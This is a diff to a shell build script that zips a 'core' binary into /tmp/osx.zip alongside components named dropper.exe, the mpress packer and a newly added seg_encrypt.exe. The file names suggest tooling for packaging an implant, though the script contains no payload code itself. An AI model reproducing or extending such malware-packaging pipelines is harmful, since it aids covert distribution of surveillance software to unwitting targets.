@@ -26,8 +26,8 @@ fi
 
 echo "synchronize core to DB" > /tmp/db_log.txt
 
-. ~/.env
-export GEM_HOME=$GEM_HOME
+#. ~/.env
+#export GEM_HOME=$GEM_HOME
 
 # create zip archive
 echo "creating archive tmp dir..." >> /tmp/db_log.txt 2>&1
@@ -38,18 +38,15 @@ mkdir /tmp/osx_tmp
 
 cp $TOOL_DIR/test_parts/default /tmp/osx_tmp/
 cp $TOOL_DIR/test_parts/demo_image /tmp/osx_tmp/
-cp $TOOL_DIR/test_parts/driver /tmp/osx_tmp/
-cp $TOOL_DIR/test_parts/driver64 /tmp/osx_tmp/
 cp $TOOL_DIR/test_parts/dropper.exe /tmp/osx_tmp/
-cp $TOOL_DIR/test_parts/icon /tmp/osx_tmp/
 cp $TOOL_DIR/test_parts/mpress.exe /tmp/osx_tmp/
+cp $TOOL_DIR/test_parts/seg_encrypt.exe /tmp/osx_tmp/
 cp $TOOL_DIR/test_parts/version /tmp/osx_tmp/
 cp $CORE /tmp/osx_tmp/core
-cp $INPUTMANAGER /tmp/osx_tmp/inputmanager
 
 echo "creating archive file..." >> /tmp/db_log.txt 2>&1
 
-/usr/bin/zip -j /tmp/osx.zip /tmp/osx_tmp/inputmanager /tmp/osx_tmp/core /tmp/osx_tmp/default /tmp/osx_tmp/demo_image /tmp/osx_tmp/driver /tmp/osx_tmp/driver64 /tmp/osx_tmp/dropper.exe /tmp/osx_tmp/icon /tmp/osx_tmp/version /tmp/osx_tmp/mpress.exe
+/usr/bin/zip -j /tmp/osx.zip /tmp/osx_tmp/core /tmp/osx_tmp/default /tmp/osx_tmp/demo_image /tmp/osx_tmp/dropper.exe /tmp/osx_tmp/seg_encrypt.exe /tmp/osx_tmp/version /tmp/osx_tmp/mpress.exe
 
 sleep 1
 
